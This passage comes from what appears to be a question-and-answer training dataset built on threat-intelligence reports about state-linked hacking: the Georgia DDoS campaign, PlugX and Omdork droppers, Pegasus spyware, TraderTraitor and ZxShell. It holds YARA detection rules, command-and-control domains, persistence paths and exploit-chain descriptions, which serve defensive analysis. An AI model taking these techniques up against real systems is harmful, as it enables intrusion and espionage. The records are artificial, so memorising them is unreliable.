Internet addresses, behind Nigeria, Bangladesh, Bolivia and El Salvador, according to Renesys, a Manchester, N.H., firm that provides performance data on the state of Internet. Cyberattacks have far less impact on such a country than they might on a more Internet-dependent nation, like Israel, Estonia or the United States, where vital services like transportation, power and banking are tied to the Internet.\nIn Georgia, media, communications and transportation companies were also attacked, according to security researchers. Shadowserver saw the attack against Georgia spread to computers throughout the government after Russian troops entered the Georgian province of South Ossetia. The National Bank of Georgia's Web site was defaced at one point. Images of 20thcentury dictators as well as an image of Georgia's president, Mr. Saakashvili, were placed on the site. \"Could this somehow be indirect Russian action? Yes, but considering Russia is past playing nice and uses real bombs, they could have attacked more strategic targets or eliminated the infrastructure kinetically,\" said Gadi Evron, an Israeli network security expert. \"The nature of what's going on isn't clear,\" he said.\nThe phrase \"a wilderness of mirrors\" usually describes the murky world surrounding opposing intelligence agencies. It also neatly summarizes the array of conflicting facts and accusations encompassing the cyberwar now taking place in tandem with the Russian fighting in Georgia.\nIn addition to D.D.O.S. attacks that crippled Georgia's limited Internet infrastructure, researchers said there was evidence of redirection of Internet traffic through Russian telecommunications firms beginning last weekend. The attacks continued on Tuesday, controlled by software programs that were\nlocated in hosting centers controlled by a Russian telecommunications firms. A Russian-language Web site, stopgeorgia.ru, also continued to operate and offer software for download used for D.D.O.S. attacks.\nOver the weekend a number of American computer security researchers tracking malicious programs known as botnets, which were blasting streams of useless data at Georgian computers, said they saw clear evidence of a shadowy St. Petersburg-based criminal gang known as the Russian Business Network, or R.B.N.\n\"The attackers are using the same tools and the same attack commands that have been used by the R.B.N. and in some cases the attacks are being launched from computers they are known to control,\" said Don Jackson, director of threat intelligence for SecureWorks, a computer security firm based in Atlanta.\nHe noted that in the run-up to the start of the war over the weekend, computer researchers had watched as botnets were \"staged\" in preparation for the attack, and then activated shortly before Russian air strikes began on Saturday.\nThe evidence on R.B.N. and whether it is controlled by, or coordinating with the Russian government remains unclear. The group has been linked to online criminal activities including child pornography, malware, identity theft, phishing and spam. Other computer researchers said that R.B.N.'s role is ambiguous at best. \"We are simply seeing the attacks coming from known hosting services,\" said Paul Ferguson, an advanced threat researcher at Trend Micro, an Internet security company based in Cupertino, Calif. A Russian government spokesman said that it was possible that individuals in Russia or elsewhere had taken it upon themselves to start the attacks.\n\"I cannot exclude this possibility,\" Yevgeniy Khorishko, a spokesman for the Russian Embassy in Washington, said. \"There are people who don't agree with something and they try to express themselves. You have people like this in your country.\"\n\"Jumping to conclusions is premature,\" said Mr. Evron, who founded the Israeli Computer Emergency Response Team.\nMedium Headline: Georgia targeted in cyber attack\nGeorgian government websites have been under intense cyber attack on top of the Russian military strikes launched against the country late last week, a US Internet firm said Tuesday.\nTulip Systems Inc said they took over hosting of the websites for Georgia's presidency and a major television network on Saturday, a day after Russian forces poured into Georgia in response to Tbilisi's attacks on a Moscow-backed rebel province.\nTulip executive Tom Burling said the distributed-denial-of-service (DDoS) attacks began in the weeks running up to the outbreak of the Russia-Georgia conflict and continued Tuesday after the Kremlin announced it had ceased hostilities in the former Soviet state.\n\"They have been attacking Georgia from a cyber standpoint since July,\" Burling told AFP. \"They are still doing it now.\"\n\"Our poor technician here has gotten three hours sleep in the past four days,\" he said.\nBurling suggested that Russia was behind the attacks, which are similar to a cyber offensive waged against Estonia last year that coincided with a diplomatic spat between the Baltic state and Moscow.\nDDoS attacks consist of overloading websites with so many online requests that systems crash.\nBurling said Georgian government websites were being slammed with hundreds of millions of simultaneous requests for documents when Tulip gave them refuge, Burling said.\n\"The cyber attack was taking down every Georgian government website,\" he said.\nOn Tuesday, the Georgian sites hosted on Tulip were still reportedly getting hit with 68,000 requests at a time.\nRussia has denied involvement in cyber assaults on Georgia and experts say it is difficult to determine exactly who is behind such attacks.\n\"The Georgian government's websites have obviously been under attack,\" said Gadi Evron, an Israeli computer security specialist that investigated the cyber assault on Estonia.\n\"It is simply too early and we lack enough information to reach any conclusion as to the motive and identity of the attackers,\" he said.\nEvron said that such cyber warfare has become commonplace in the past decade.\n\"These types of attack are only natural and happen immediately following any conflict or political tension,\" Evron told AFP in an email.\nDDoS attacks are simple, economical and hard to trace.\nThe assaults are typically done by using networks of computers that have been turned into \"zombies\" or \"bots\" with malicious software planted by hackers without the owners of machines being aware.\n\"Botnets\" can grow to thousands or millions of machines and be commanded to simultaneously make requests at targeted websites.\nAndre DiMino, director of Shadowserver, a nonprofit Internet security watchdog with team members around the world, warned against jumping to the conclusion that Russia's government is the culprit in the Georgia cyber attacks.\n\"This actually looks more like grass roots hacktivist types -- people that jumped on the bandwagon,\" DiMino said, using Internet jargon referring to political activists that resort to online evil-doing.\nTulip's Burling said the trend of such cyber maliciousness was a cause for concern.\n\"It's like the Olympics. We are supposed to be above politics in the Internet community.\"\nGeorgian forces attacked the Moscow-backed rebel province of South Ossetia to regain control of the region which broke away from Tbilisi in the early 1990s.\nRussian troops and tanks poured into Georgia on Friday after the Georgian offensive.\n\nBased on the above text, answer a question. How did the cyberattacks affect Georgia's Internet infrastructure and government websites, and what measures were taken to mitigate these attacks?",
    "output": "The cyberattacks significantly affected Georgia's Internet infrastructure, rendering many government websites inaccessible and limiting the government's ability to spread its message online and connect with sympathizers during the conflict with Russia. Tulip Systems Inc., a US Internet firm, took over hosting of the websites for Georgia's presidency and a major television network to mitigate the attacks. Despite these efforts, the websites continued to face D.D.O.S. attacks, with hundreds of millions of simultaneous requests overwhelming the servers. As of the reporting date, the attacks were still ongoing, with the Georgian sites hosted on Tulip receiving 68,000 requests at a time.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: SAV detection:\nTroj/DocDrop-CD, Troj/Omdork-E, Troj/PlugX-AP\nC&C servers:\nwww.notebookhk.net\nRegistrant Name: lee stan\nRegistrant Organization: lee stan\nRegistrant Street: xianggangdiqu\nRegistrant City: xianggangdiqu\nRegistrant State/Province: xianggang\nRegistrant Postal Code: 796373\nRegistrant Country: HK\nRegistrant Phone : +0.04375094543\nRegistrant Phone Ext:\nRegistrant Fax: +0.04375094543\nRegistrant Fax Ext:\nRegistrant Email:stanlee@gmail.com\n56b3f0f03ae12b56c000df67c1153d518c8a66fc\nThis sample is an outlier. It does not distribute PlugX, but uses a strikingly similar persistence method, with exactly the same file names that are used with PlugX installations. Only the final payload is a different backdoor, Omdork, which has earlier been observed in PlugX related distribution channels.\nOriginal name:\nUnited Nations Security Council Committee Pursuant to Resolutions1267.doc\nBig Headline: System activity:\nDropped to C:\\Documents and Settings\\All Users\\FlashUpdate\\RasTls.exe and C:\\Documents and Settings\\All Users\\FlashUpdate\\msi.dll.mov (encrypted payload) and %WINDOWS%\\Tasks\\n. dll.\nThe persistence is achieved by two methods: RasTls.exe is registered in HKCU\\Software\\ Microsoft\\Windows\\CurrentVersion\\Run \u2192 msusr, and the n.dll is dropped to the Windows Tasks directory for  automatic execution.\nWhile the file names are the same as in the case of many PlugX deployments, the files themselves are very different.\nRasTls.exe is not digitally signed, it is the loader Trojan, that loads the encrypted payload from a resource. This payload itself contains a loader code, and an embedded executable, that is the final payload.\nThe n.dll file executes a backup installer, M.B, which is dropped into the %TEMP% directory. This installer is a self-extracting WinRAR that contains RasTls.exe and a config file.\nThere are still reasons to believe that this malware is strongly connected to the PlugX group:\n\u00cc It uses the same filenames as some of the PlugX deployments\n\u00cc It uses the same carrier document as the other PlugX variants in this campaign, including the unique shellcode\n\u00cc The same n.dll is used in both the Omdork and PlugX deployments\nBig Headline: SAV detection:\nTroj/DocDrop-CD, Troj/Omdork-E\nC&C servers:\nwww.togolaga.com\nRegistrant Name: wang feng\nRegistrant Organization: wang feng\nRegistrant Street: beijingshi\nRegistrant City: beijingshi\nRegistrant State/Province: beijing\nRegistrant Postal Code: 100000\nRegistrant Country: CN\nRegistrant Phone : +86.01090888962\nRegistrant Phone Ext:\nRegistrant Fax: +86.01090888962\nRegistrant Fax Ext:\nRegistrant Email:battuya_2002@yahoo.com\nMore than 100 million users in 150 countries rely on Sophos as the best protection against complex threats and data loss. Sophos is committed to providing complete security solutions that are simple to deploy, manage, and use that deliver the industry's lowest total cost of ownership. Sophos offers award winning encryption, endpoint security, web, email, mobile, server and network security backed by SophosLabs\u2014a global network of threat intelligence centers. Read more at (<http://www.sophos.com/products>)www.sophos.com/products.\nUnited Kingdom and Worldwide Sales\nTel: +44 (0)8447 671131\nEmail: sales@sophos.com\nNorth American Sales\nToll Free: 1-866-866-2802\nEmail: nasales@sophos.com\nAustralia and New Zealand Sales\nTel: +61 2 9409 9100\nEmail: sales@sophos.com.au\nAsia Sales\nTel: +65 62244168\nEmail: salesasia@sophos.com\nOxford, UK | Boston, USA\n\u00a9 Copyright 2014. Sophos Ltd. All rights reserved.\nRegistered in England and Wales No. 2096520, The Pentagon, Abingdon Science Park, Abingdon, OX14 3YP, UK Sophos is the registered trademark of Sophos Ltd. All other product and company names mentioned are trademarks or registered trademarks of their respective owners.\n1180-06.14DD.tpna.simple\n\nBased on the above text, answer a question. Why might the PlugX group have chosen to use the same persistence method and file names for distributing the Omdork backdoor as they did for PlugX, despite the different payloads?",
    "output": "The PlugX group's choice to use the same persistence method and file names for distributing the Omdork backdoor could be attributed to several factors. Firstly, reusing known methods and file names can help evade detection by security systems that rely on signature-based detection. Secondly, it simplifies the deployment process for the attackers, allowing them to leverage existing infrastructure and techniques. Additionally, the use of the same carrier document and unique shellcode further supports the idea that the PlugX group is behind the Omdork distribution, indicating a consistent modus operandi across different campaigns.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Cyber-intruder sparks response, debate\nBy Ellen Nakashima\nThe first sign of trouble was a mysterious signal emanating from deep within the U.S. military's classified computer network. Like a human spy, a piece of covert software in the supposedly secure system was \"beaconing\" \u2014 trying to send coded messages back to its creator.\nAn elite team working in a windowless room at the National Security Agency soon determined that a rogue program had infected a classified network, kept separate from the public Internet, that harbored some of the military's most important secrets, including battle plans used by commanders in Afghanistan and Iraq.\nThe government's top cyberwarriors couldn't immediately tell who created the program or why, although they would come to suspect the Russian intelligence service. Nor could they tell how long it had been there, but they soon deduced the ingeniously simple means of transmission, according to several current and former U.S. officials. The malicious software, or malware, caught a ride on an everyday thumb drive that allowed it to enter the secret system and begin looking for documents to steal. Then it spread by copying itself onto other thumb drives.\nPentagon officials consider the incident, discovered in October 2008, to be the most serious breach of the U.S. military's classified computer systems. The response, over the past three years, transformed the government's approach to cybersecurity, galvanizing the creation of a new military command charged with bolstering the military's computer defenses and preparing for eventual offensive operations. The efforts to neutralize the malware, through an operation code-named (<http://www.washingtonpost.com/wp-dyn/content/article/2010/08/24/AR2010082406495.html>)Buckshot Yankee, also demonstrated the importance of computer espionage in devising effective responses to cyberthreats.\nBut the breach and its aftermath also have opened a rare window into the (<http://www.washingtonpost.com/wp-dyn/content/article/2010/11/05/AR2010110507304.html?wprss=rss_world>)legal concerns and bureaucratic tensions that affect military operations in an arena where the United States faces increasingly sophisticated threats. Like the running debates over the use of drones and other evolving military technologies, rapid advances in computing capability are forcing complex deliberations over the (<http://www.washingtonpost.com/national/list-of-cyber-weapons-developed-by-pentagon-to-streamline-computer-warfare/2011/05/31/AGSublFH_story.html>)appropriate use of new tools and weapons.\nThis article, which contains previously undisclosed information on the extent of the infection, the nature of the response and the fractious policy debate it inspired, is based on interviews with two dozen current and former U.S. officials and others with knowledge of the operation. Many of them assert that while the military has a growing technical capacity to operate in cyberspace, it lacks authority to defend civilian networks effectively.\n\"The danger is not so much that cyber capabilities will be used without warning by some crazy general,\" said Stewart A. Baker, a former NSA general counsel. \"The real worry is they won't be used at all because the generals don't know what the rules are.\"\nQ: How did the malware associated with the Buckshot Yankee operation manage to infiltrate the U.S. military's classified computer network, and what measures were taken to mitigate this threat?",
    "output": "The malware infiltrated the U.S. military's classified computer network via a thumb drive. This malicious software was designed to look for documents to steal and then spread by copying itself onto other thumb drives. The response to this breach, known as Operation Buckshot Yankee, involved the creation of a new military command tasked with enhancing the military's computer defenses and preparing for potential offensive operations. This incident highlighted the importance of computer espionage in developing effective responses to cyberthreats and led to significant changes in the government's approach to cybersecurity.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Experienced actor stays active\nAntlion is believed to have been involved in espionage activities since at least 2011, and this recent activity shows that it is still an actor to be aware of more than 10 years after it first appeared.\nThe length of time that Antlion was able to spend on victim networks is notable, with the group able to spend several months on victim networks, affording plenty of time to seek out and exfiltrate potentially sensitive information from infected organizations. The targeting of Taiwan is perhaps unsurprising given we know Chinese state-backed groups tend to be interested in organizations in that region.\nBig Headline: Yara Rules\nrule xpack_loader\n{\nmeta:\nauthor = \"Symantec, a division of Broadcom\"\nhash = \"12425edb2c50eac79f06bf228cb2dd77bb1e847c4c4a2049c91e0c5b345df5f2\"\nstrings:\n$s1 = \"Length or Hash destoryed\" wide fullword\n$s2 = \"tag unmatched\" wide fullword\n$s3 = \"File size mismatch\" wide fullword\n$s4 = \"DESFile\" wide fullword\n$p1 = \"fomsal.Properties.Resources.resources\" wide fullword\n$p2 = \"xPack.Properties.Resources.resources\" wide fullword\n$p3 = \"foslta.Properties.Resources.resources\" wide fullword\ncondition:\nuint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and (2 of ($s*) or any of ($p*))\n}\nrule xpack_service\n{\nmeta:\nauthor = \"Symantec, a division of Broadcom\"\nhash = \"390460900c318a9a5c9026208f9486af58b149d2ba98069007218973a6b0df66\"\nstrings:\n$s1 = \"C:\\\\Windows\\\\inf\\\\wdnvsc.inf\" wide fullword\n$s2 = \"PackService\" wide fullword\n$s3 = \"xPackSvc\" wide fullword\n$s4 = \"eG#!&5h8V$\" wide fullword\ncondition:\nuint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and 3 of them\n}\nrule EHAGBPSL_loader\n{\nmeta:\nauthor = \"Symantec, a division of Broadcom\"\nhash = \"e968e0d7e62fbc36ad95bc7b140cf7c32cd0f02fd6f4f914eeb7c7b87528cfe2\"\nhash = \"2a541a06929dd7d18ddbae2cb23d5455d0666af7bdcdf45b498d1130a8434632\"\nstrings:\n$s1 = {45 00 00 00 48 00 00 00 41 00 00 00 47 00 00 00 42 00 00 00 50 00 00 00 53 00 00 00 4C} // EHAGBPSL\n$s2 = {74 00 00 00 61 00 00 00 72 00 00 00 57 00 00 00 6F 00 00 00 6B} // tarWok\n$b1 = \"bnRtZ3M=\" fullword // ntmgs\n$b2 = \"TmV0d29yayBNYW5hZ2VtZW50IFNlcnZpY2U=\" fullword // Network Management Service\n$b3 = \"UHJvdmlkZXMgYWJpbGl0eSB0byBtYW5hZ2UgbmV0d29yayBvdmVyIHRoZSBuZXQgcHJvdG9jb2wu\" fullword // Provides ability to manage network over the net protocol.\n$b4 = \"bnRtZ3MuZG\" // ntmgs.dll / ntmgs.dat\n$b5 = \"aW1nMS5qcGc=\" fullword // img1.jpg\n$c1 = \"Wscms.nls\" fullword\n$c2 = \"Wscms.dat\" fullword\n$c3 = \"Wscms.dll\" fullword\n$c4 = \"Wscms.ini\" fullword\n$c5 = \"Images01.jpg\" fullword\n$e1 = \"StartWork\" fullword\n$e2 = \"ServiceMain\" fullword\n$h1 = {DD 9C BD 72} // CreateRemoteThread\n$h2 = {C0 97 E2 EF} // OpenProcess\n$h3 = {32 6D C7 D5} // RegisterServiceCtrlHandlerA\n$h4 = {A1 6A 3D D8} // WriteProcessMemory\ncondition:\nuint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and all of ($e*) and (all of ($s*) or any of ($b*) or 3 of ($c*) or all of ($h*))\n}\nrule keylogger\n{\nmeta:\nauthor = \"Symantec, a division of Broadcom\"\nhash = \"3db621cac1d026714356501f558b1847212c91169314c1d43bfc3a4798467d0d\"\nhash = \"789f0ec8e60fbc8645641a47bc821b11a4486f28892b6ce14f867a40247954ed\"\nstrings:\n$m1 = \"BKB_Test\" fullword\n$m2 = \"KLG_sd76bxds1N\" fullword\n$k1 = \"[%d/%02d/%02d %02d:%02d:%02d K-E-Y-L-O-G]\" fullword\n$k2 = \"[%d/%02d/%02d %02d:%02d:%02d C-L-I-P-B-D]\" fullword\n$k3 = \"< Title--%s-- >\" fullword\n$k4 = \"ImpersonateLoggedOnUser Error(%d)\" fullword\n$f1 = {55 73 65 72 ?? ?? ?? 00 00 00 ?? ?? ?? 6B 65 79 2E} // Userkey.\n$f2 = {55 73 65 72 ?? ?? ?? 00 00 00 ?? ?? ?? 64 61 74 2E} // Userdat.\ncondition:\nuint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and (2 of ($k*) or (any of ($m*) and any of ($f*)))\n}\nrule checkid_loader\n{\nmeta:\nauthor = \"Symantec, a division of Broadcom\"\ndescription = \"BlackHole/BlackSwan / QuasarRAT/xClient loader\"\nhash = \"29d7b82f9ae7fa0dbaf2d18c4d38d18028d652ed1ccc0846e8c781b4015b5f78\"\nstrings:\n$s1 = \"Call %s.%s(\\\"%s\\\") => %d\" fullword wide\n$s2 = \"Assembly::CreateInstance failed w/hr 0x%08lx\" fullword wide\n$s3 = \"checkID\"\n$s4 = \"NULL == checkID hMutex\" fullword\n$s5 = \"checkID Mutex ERROR_ALREADY_EXISTS\" fullword\n$s6 = \"dllmain mutex ERROR_ALREADY_EXISTS\" fullword\n$x1 = \"xClient.Program\" fullword wide\n$x2 = \"LoadPayload\" fullword\n$m1 = \"SFZJ_Wh16gJGFKL\" ascii wide\n$m2 = \"d5129799-e543-4b8b-bb1b-e0cba81bccf8\" ascii wide\n$m3 = \"USA_HardBlack\" ascii wide\n$b1 = \"BlackHole.Slave.Program\" fullword wide\n$b2 = \"NuGet\\\\Config\" wide\n$b3 = \"VisualStudio.cfi\" wide\n$p = {E1 F6 3C AC AF AC AC AC A8 AC AC AC 53 53 AC AC 14}\n$t = \"0s+Nksjd1czZ1drJktPO24aEjISMtsvLy5LJzNjdyNnL1dLY08uS39PRhoSMhIy2jYyPkomNko2IjJKEiIaEjISM\"\ncondition:\nuint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and 2 of ($s*) and (all of ($x*) or any of ($m*) or all of ($b*) or $p or $t)\n}\nThe Threat Hunter Team is a group of security experts within Symantec whose mission is to investigate targeted attacks, drive enhanced protection in Symantec products, and offer analysis that helps customers respond to attacks.\nAnswer this question: How does the persistence and longevity of Antlion's presence on victim networks contribute to its effectiveness in espionage activities?",
    "output": "Antlion's ability to remain on victim networks for several months allows the group to thoroughly seek out and exfiltrate potentially sensitive information. This extended period provides ample time for the attackers to navigate through the network, identify valuable data, and stage it for exfiltration without raising immediate suspicion. The lengthy duration of their presence significantly enhances their chances of successful espionage.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the AlticGO variant of the TraderTraitor malware operate, and what distinguishes it from other variants like TokenAIS and CryptAIS?",
    "output": "AlticGO is a variant of the TraderTraitor malware observed packaged as Nullsoft Scriptable Install System (NSIS) Windows executables that extract an Electron application packaged for Windows. It contains a simpler version of TraderTraitor code in a function exported as UpdateCheckSync(), located in a file bundled in the app.asar archive. This function makes an HTTP request to hxxps://www.alticgo[.]com/update/ or hxxps://www.esilet[.]com/update/, and the response is written to disk and executed in a new shell using the child_process.exec() method in Node.js. Unlike newer versions of TraderTraitor, AlticGO does not have a mechanism to decrypt a payload, distinguishing it from variants like TokenAIS and CryptAIS, which use AES 256 encryption in CBC or CTR mode to decrypt the payload before execution.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nMedium Headline: 3.2. Device Infection\nAccording to the purported 2013 NSO Group Pegasus documentation found in the Hacking Team materials, NSO Group offers two remote installation vectors for spyware onto a target's device: a zero-click vector, and a one-click vector. The one-click vector involves sending the target a normal SMS text message with a link to a malicious website. The malicious website contains an exploit for the web browser on the target's device, and any other required exploits to implant the spyware. In the attack against Mansoor, the Trident exploit chain was used.\nTo use NSO Group's zero-click vector, an operator instead sends the same link via a special type of SMS message, like a (<https://www.silentservices.de/security-advisory-samsung-leaves-its-android-smartphones-with-wap-push-feature-open-to-attacks-one-sms-to-rule-them-all/>)WAP Push Service Loading (SL) message. A WAP Push SL message causes a phone to automatically open a link in a web browser instance, eliminating the need for a user to click on the link to become infected. Many newer models of phones have started ignoring or restricting WAP Push messages. Mobile network providers may also decide to block these messages.\nThe documentation refers to a malicious website employed in installation of the spyware (\"Agent\") as an Anonymizer, which communicates with a Pegasus Installation Server located on the operator's premises. When a target visits a malicious link from their device, the Anonymizer forwards the request to the Pegasus Installation Server, which examines the target device's (<https://en.wikipedia.org/wiki/User_agent>)User-Agent header to determine if Pegasus has an exploit chain, such as the Trident, that supports the device.\nIf the device is supported, the Pegasus Installation Server returns the appropriate exploit to the target device through the Anonymizer and attempts an infection. If infection fails for any reason, the target's web browser will redirect to a legitimate website specified by the Pegasus operator, in order to avoid arousing the target's suspicion.\nIn the operation targeting Mansoor, the one-click vector was used, with anonymizer sms.webadv.co (see Section 4: The Trident iOS Exploit Chain and Payload for more details).\nMedium Headline: 3.3. Data Collection\nAccording to the purported NSO Group documentation, once successfully implanted on a phone using an exploit chain like the Trident, Pegasus can actively record or passively gather a variety of different data about the device. By giving full access to the phone's files, messages, microphone and video camera, the operator is able to turn the device into a silent digital spy in the target's pocket.\nIn the spyware used in targeting Mansoor, we confirmed many elements of this functionality, and observed indications that the collection of the following types of data was supported, among others (see Section 4.2: The Payload for more details):\nCalls made by phone, WhatsApp and Viber,\nSMS messages, as well as messages and other data from popular apps like Gmail, WhatsApp, Skype, Facebook, KakaoTalk, Telegram, and others,\nA wide range of personal data, such as calendar data and contact lists, as well as passwords, including Wi-Fi passwords.\nMedium Headline: 3.4. Exfiltration\nAccording to the purported NSO Group documentation, an infected device transmits collected information back to a Pegasus Data Server at the operator's premises, via the PATN (Pegasus Anonymizing Transmission Network). The PATN appears to be a proxy chain system similar to (<https://citizenlab.org/2014/02/mapping-hacking-teams-untraceable-spyware/>)Hacking Team's anonymizers and (<https://citizenlab.org/2015/10/mapping-finfishers-continuing-proliferation/>)FinFisher's relays. The chain is intended to obfuscate the identity of the government client associated with a particular operation. Once the collected information arrives on the Pegasus Data Server, an operator may visualize the information on a Pegasus Working Station.\nThe implant in the attack targeting Mansoor communicated with two PATN nodes: aalaan.tv and manoraonline.net. The first of these, aalaan.tv, appears to be a lookalike domain for the legitimate (<http://www.alaan.tv/>)alaan.tv, a Gulf-based satellite television channel (see Section 5.2 for more details on lookalike domains observed in apparent NSO Group infrastructure).\nMedium Headline: 3.5. Prioritizing Stealth\nOne interesting design decision of NSO Group's Pegasus system, according to the purported NSO Group documentation, is that it emphasizes stealth above almost all else. As the documentation states:\nIn general, we understand that it is more important that the source will not be exposed and the target will suspect nothing than keeping the agent alive and working.\nCertain Pegasus features are only enabled when the device is idle and the screen is off, such as \"environmental sound recording\" (hot mic) and \"photo taking.\" The documentation also states that the spyware implements a \"self-destruct mechanism,\" which may be activated automatically \"in cases where a great probability of exposing the agent exists.\" However, the documentation claims that sometimes Pegasus removal can result in an infected device rebooting immediately after removal.\n\nHow does the Pegasus spyware prioritize stealth in its operations, and what mechanisms does it employ to ensure that the target remains unaware of the infection?",
    "output": "Pegasus prioritizes stealth above almost all else to ensure that the target remains unaware of the infection. Certain features, such as 'environmental sound recording' (hot mic) and 'photo taking,' are only enabled when the device is idle and the screen is off. Additionally, the spyware implements a 'self-destruct mechanism,' which can be activated automatically in cases where there is a high probability of exposing the agent. However, the documentation notes that sometimes Pegasus removal can result in an infected device rebooting immediately after removal. This emphasis on stealth is designed to prevent the target from suspecting anything and to protect the source from being exposed.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the behavior of the malware Agent.btz, described in the APT report, relate to the characteristics of a computer worm?",
    "output": "A computer worm is a standalone malware computer program that replicates itself in order to spread to other computers. In the case of Agent.btz, it spread through the use of thumb drives, which is a common method of propagation for worms. Once a computer became infected, any thumb drive used on the machine acquired a copy of Agent.btz, ready for propagation to other computers. This behavior is consistent with the recursive methods used by worms to copy themselves without host programs and distribute themselves based on exploiting the advantages of exponential growth. Furthermore, Agent.btz's ability to beacon out in search of instructions and communicate with a master computer is similar to the way worms use networks to spread themselves and control other computers. However, unlike typical worms, Agent.btz did not seem to cause harm to the network by consuming bandwidth or corrupting files, but rather attempted to steal content. Nevertheless, its behavior is characteristic of a worm, highlighting the need for increased security measures to prevent such threats.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: MSS Tianjin Bureau\nThe most recent IntrusionTruth post assesses that GAO's Uber rides frequently took him from Huaying's address at the Fuyu Mansion to 85 Zhujiang Road (\u73e0\u6c5f\u905385\u53f7).\nWhen observed closely, the compound is a striking one complete with towers, a fenced perimeter with surveillance cameras, guarded entrances, and a building with a significant number of satellite dishes.\nThere are no markers on the building and no government listed address; however, it is apparently difficult for locals to determine where the Tianjin Bureau's location is as well. There are several Baidu questions asking what transportation routes are best to get to that specific address. Three separate ones specifically mention the 85 Zhujiang Road address as the headquarters for the MSS's Tianjin Bureau and the difficulty in finding its location9 10 11 .\nAs with most cyber-enabled operations, satellite arrays are often indicative of installations with significant signals intelligence (SIGINT) capabilities. The Tianjin Bureau appears to have the potential for such capabilities, housing several large arrays that appear to have existed since at least January 2004.\nBig Headline: Conclusion\nThere are still significant intelligence gaps that prevent Falcon Intelligence from making an assessment about STONE PANDA's potential connections to the MSS Tianjin Bureau with a high degree of confidence. However, additional information is likely to materialize either directly from IntrusionTruth or from other firms in the infosec community who are undoubtedly looking at this material as well and may have unique insight of their own. Ultimately, IntrusionTruth's prior releases on GOTHIC PANDA proved accurate and led to a U.S. Department of Justice indictment resulting in the dismantling of Boyusec. From their latest post, which contains GAO's Uber receipts, it is clear the group's information likely goes beyond merely available OSINT data.\nIt cannot be ignored that there are striking similarities between the entities associated with GOTHIC PANDA and the actors and firms mentioned in the blogs about STONE PANDA. In addition, FalconIntelligence notes that following the late 2015 Sino-U.S. brief cyber detente, much of the responsibility for western cyber intrusion operations was handed to the MSS as the PLA underwent an extensive reform that is still currently underway, and which is consolidating its military cyber forces under the Strategic Support Force.\nThough the detente saw an initial drop in Chinese intrusion activity, it has steadily been increasing over the past several years, with a majority of the intrusions into western firms being conducted by suspected contractors. These adversaries are tracked by CrowdStrike as GOTHIC PANDA, STONE PANDA, WICKED PANDA, JUDGMENT PANDA, and KRYPTONITE PANDA. Many of these adversaries have begun targeting supply chain and upstream providers to establish a potential platform for future operations and enable the collection of larger sets of data.\nWhile the APT1, PUTTER PANDA, and Operation CameraShy reports all exposed PLA units at a time when Chinese military hacking against western firms was rampant, the attention has now swung toward identifying MSS contractors. The exposure of STONE PANDA as an MSS contractor would be another blow to China's current cyber operations given STONE PANDA's prolific targeting of a variety of sectors, and may prompt an additional U.S. investigation at a tenuous time for Sino-U.S. relations during an ongoing trade war. However, it is important to note that such public revelations often force these actors to cease operations, improve their operational security (OPSEC), and then return stronger than before. As such, CrowdStrike Falcon Intelligence assesses that although Boyusec may have shuttered, elements of GOTHIC PANDA are likely to still be active. The same is likely to be true for STONE PANDA following a period of silence.\n\nHow does the presence of satellite arrays at the MSS Tianjin Bureau indicate significant signals intelligence (SIGINT) capabilities, and what implications does this have for cyber-enabled operations?",
    "output": "A: The presence of satellite arrays at the MSS Tianjin Bureau suggests significant signals intelligence (SIGINT) capabilities because such arrays are typically used for intercepting and analyzing communications signals. This capability is crucial for cyber-enabled operations as it allows for the monitoring and gathering of intelligence from various sources, enhancing the bureau's ability to conduct sophisticated cyber operations. The fact that these arrays have existed since at least January 2004 indicates a long-standing investment in SIGINT infrastructure, which supports the bureau's potential involvement in advanced cyber activities.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: ASLR bypass\nBecause the vulnerability allows attackers to modify memory to an arbitrary address, the attacker can use it to bypass ASLR. For example, the attacker corrupts a Flash Vector object and then accesses the corrupted object from within Flash to access memory. We have discussed this technique and other ASLR bypass approaches (<http://www.fireeye.com/blog/technical/cyber-exploits/2013/10/aslr-bypass-apocalypse-in-lately-zero-day-exploits.html>)in our blog. One minor difference between the previous approaches and this attack is the heap spray address, which was changed to 0x1a1b2000 in this exploit.\nBig Headline: Shellcode analysis\nSubsequently, the malicious Flash code downloads a file containing the dropped malware payload. The beginning of the file is a JPG image; the end of the file (offset 36321) is the payload, encoded with an XOR key of 0\u00d795. The attacker appends the payload to the shellcode before pivoting to code control. Then, when the shellcode is executed, the malware creates files \"sqlrenew.txt\" and \"stream.exe\". The tail of the image file is decoded, and written to these files. \"sqlrenew.txt\" is then executed with the LoadLibraryA Windows API call.\nBig Headline: ZxShell payload analysis\nAs documented above, this exploit dropped an XOR (0\u00d795) payload that executed a ZxShell backdoor (MD5: 8455bbb9a210ce603a1b646b0d951bce). The compile date of the payload was 2014-02-11, and the last modified date of the exploit code was also 2014-02-11. This suggests that this instantiation of the exploit was very recent and was deployed for this specific strategic Web compromise of the Veterans of Foreign Wars website. A possible objective in the SnowMan attack is targeting military service members to steal military intelligence. In addition to retirees, active military personnel use the VFW website. It is probably no coincidence that Monday, Feb. 17, is a U.S. holiday, and much of the U.S. Capitol shut down\nThursday amid a severe winter storm.\nThe ZxShell backdoor is a widely used and publicly available tool used by multiple threat actors linked to cyber espionage operations. This particular variant called back to a command and control server located at newss[.]effers[.]com. This domain currently resolves to 118.99.60.142. The domain info[.]flnet[.]org also resolved to this IP address on 2014-02-12.\nBig Headline: Infrastructure analysis\nThe info[.]flnet[.]org domain overlaps with icybin[.]flnet[.]org and book[.]flnet[.]org via the previous resolutions to the following IP 